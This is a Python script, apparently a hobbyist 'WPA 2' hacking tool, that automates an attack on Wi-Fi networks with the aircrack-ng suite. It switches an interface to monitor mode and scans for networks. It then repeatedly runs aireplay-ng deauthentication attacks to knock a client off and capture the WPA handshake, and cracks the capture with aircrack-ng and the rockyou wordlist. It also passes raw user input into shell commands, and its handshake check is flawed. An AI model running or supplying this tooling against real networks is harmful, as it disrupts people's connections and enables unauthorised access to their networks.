import os
import subprocess
import netifaces
import time
from colorama import Fore, Style, init
import sys
import threading
import ctypes
import socket

init(autoreset=True)

def root_check():
    if os.name == 'nt':
        try:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            is_admin = False
        if not is_admin:
            print(Fore.RED + Style.BRIGHT + "⚠️  Please run this script as Administrator.\n" +
                  Fore.YELLOW + "Right-click the script or CMD and choose 'Run as administrator'.")
            sys.exit()
    else:
        if os.getuid() != 0:
            print(Fore.RED + Style.BRIGHT + "⚠️  Please run this script with root privileges.\n" +
                  Fore.YELLOW + "Execute the following command in your terminal and then run the script again:\n" +
                  Fore.CYAN + "sudo su")
            sys.exit()

def get_wifi_interfaces():
    return [interface for interface in netifaces.interfaces() if 'wlan' in interface]

def retry_wifi_scan():
    attempts = 0
    while attempts < 4:
        interfaces = get_wifi_interfaces()
        if interfaces:
            return interfaces

        attempts += 1
        print(Fore.RED + f"❌ No Wi-Fi interfaces found (Attempt {attempts})")

        if attempts == 3:
            print(Fore.YELLOW + "Try disconnecting and reconnecting your Wi-Fi interface and try scanning again.")
        
        if attempts >= 4:
            print(Fore.RED + Style.BRIGHT + "⚠️  Wi-Fi interface not found. Please restart the program.")
            sys.exit()

        response = input(Fore.GREEN + "Do you want to retry scanning? (Y/N): ").strip().upper()
        if response != 'Y':
            print(Fore.RED + "Exiting program as no interfaces were found.")
            sys.exit()

def change_to_monitor_mode(interface):
    subprocess.call(f"sudo ifconfig {interface} down", shell=True)
    subprocess.call(f"sudo airmon-ng start {interface}", shell=True)

def get_current_mode(interface):
    output = subprocess.check_output(f"sudo iwconfig {interface}", shell=True).decode()
    return "monitor" if "Mode:Monitor" in output else "managed"

def scan_for_networks(interface):
    try:
        return subprocess.Popen(f"sudo airodump-ng {interface}", shell=True)
    except Exception as e:
        print(Fore.RED + f"Error starting scan: {e}")

def animated_title():
    title_ascii = r"""
//     ___       __   ________  ________           _______     
//    |\  \     |\  \|\   __  \|\   __  \         /  ___  \    
//    \ \  \    \ \  \ \  \|\  \ \  \|\  \       /__/|_/  /|   
//     \ \  \  __\ \  \ \   ____\ \   __  \      |__|//  / /   
//      \ \  \|\__\_\  \ \  \___|\ \  \ \  \         /  /_/__  
//       \ \____________\ \__\    \ \__\ \__\       |\________\
//        \|____________|\|__|     \|__|\|__|        \|_______|
//                                                             
//                                                             
//                                                             
    """
    version = "v2.0"
    author = "Developed by: 𝐇𝟒𝐜𝐤𝐌𝐞𝐃𝐚𝐃𝐝𝐲"
    github = "https://github.com/H4ckMeDaDdy"

    print(Fore.RED + Style.BRIGHT + title_ascii.center(60, ' '))
    print(Fore.WHITE + Style.BRIGHT + version.center(60, ' '))
    print(Fore.CYAN + Style.BRIGHT + author.center(60, ' '))
    print(Fore.CYAN + Style.BRIGHT + github.center(60, ' '))
    print("\n" + Fore.GREEN + "=" * 60 + "\n")

def loading_animation():
    print(Fore.YELLOW + "Loading", end="")
    for _ in range(3):
        time.sleep(0.5)
        print(".", end="", flush=True)
    print("\n" + Fore.GREEN + "=" * 60 + "\n")

def main(): 
    global stop_spinner_event
    stop_spinner_event = threading.Event()

    animated_title()
    loading_animation()
    
    root_check()
    print(Fore.BLUE + "Scanning for Wi-Fi interfaces...")
    interfaces = retry_wifi_scan()
    
    print(Fore.GREEN + "Available Wi-Fi interfaces:")
    for i, interface in enumerate(interfaces):
        print(f"{Fore.CYAN}{Style.BRIGHT}{i}: {interface}")

    choice = int(input(Fore.GREEN + Style.BRIGHT + "Select interface: "))
    if 0 <= choice < len(interfaces):
        interface = interfaces[choice]
        current_mode = get_current_mode(interface)

        print(Fore.YELLOW + f"Current mode for {interface} is {current_mode}.")
        action = input(Fore.GREEN + Style.BRIGHT + "Choose mode: (1) Change to Monitor, (2) Change to Managed, (3) Keep Current Mode: ")

        if action == '1' and current_mode != "monitor":
            change_to_monitor_mode(interface)
            print(Fore.GREEN + Style.BRIGHT + f"{interface} set to monitor mode.")
        elif action == '2' and current_mode != "managed":
            subprocess.call(f"sudo airmon-ng stop {interface}", shell=True)
            subprocess.call(f"sudo ifconfig {interface} up", shell=True)
            print(Fore.GREEN + Style.BRIGHT + f"{interface} set to managed mode.")
        elif action == '3':
            print(Fore.YELLOW + "Keeping current mode.")
        else:
            print(Fore.RED + "❌ No changes made or invalid option.")

        input(Fore.GREEN + Style.BRIGHT + "Press Enter to start scanning...")
        print(Fore.BLUE + "Starting scan... (Press Ctrl + C to stop)")

        process = scan_for_networks(interface)

        try:
            process.wait()
        except KeyboardInterrupt:
            stop_spinner_event.set()
            print(Fore.RED + "\nScan stopped.")
            process.terminate()
            process.wait()

        selected_bssid = input(Fore.GREEN + Style.BRIGHT + "Enter the BSSID of the network you want to scan: ")
        selected_channel = input(Fore.GREEN + Style.BRIGHT + "Enter the channel of the network: ")
        filename = input(Fore.GREEN + Style.BRIGHT + "Enter a name for the file to save the handshake: ")

        print(Fore.BLUE + "Starting detailed scan...")
        detailed_scan_process = subprocess.Popen(
            f"gnome-terminal --geometry=100x24 -- bash -c 'sudo airodump-ng -c {selected_channel} --bssid {selected_bssid} --write {filename} {interface}; exec bash'", shell=True
        )

        station_bssid = input(Fore.GREEN + Style.BRIGHT + "Enter the Station (device) BSSID of a connected device: ")

        print(Fore.YELLOW + f"Ready to execute: aireplay-ng -0 30 -a {selected_bssid} -c {station_bssid} {interface}")
        input(Fore.GREEN + Style.BRIGHT + "Press Enter to confirm and execute the command...")

        print(Fore.YELLOW + f"Executing deauth attack: aireplay-ng -0 30 -a {selected_bssid} -c {station_bssid} {interface}")
        handshake_captured = False

        while not handshake_captured:
            subprocess.call(f"aireplay-ng -0 30 -a {selected_bssid} -c {station_bssid} {interface}", shell=True)
            time.sleep(10)

            if os.path.isfile(f"{filename}-01.cap"):
                with open(f"{filename}-01.cap", "rb") as f:
                    content = f.read()
                    if b"WPA handshake" in content:
                        print(Fore.GREEN + "✅ Handshake captured!")
                        handshake_captured = True
                        detailed_scan_process.terminate()
                        break
            else:
                print(Fore.YELLOW + "Checking for handshake...")

        print(Fore.BLUE + "Listing files...")
        subprocess.call("ls", shell=True)

        input(Fore.GREEN + Style.BRIGHT + "Press Enter when you're ready to execute the command...")
        captured_file = f"{filename}-01.cap"
        command = f"aircrack-ng -w /usr/share/wordlists/rockyou.txt {captured_file}"
        print(Fore.YELLOW + f"Executing: {command}")
        subprocess.call(command, shell=True)

if __name__ == "__main__":

    main()


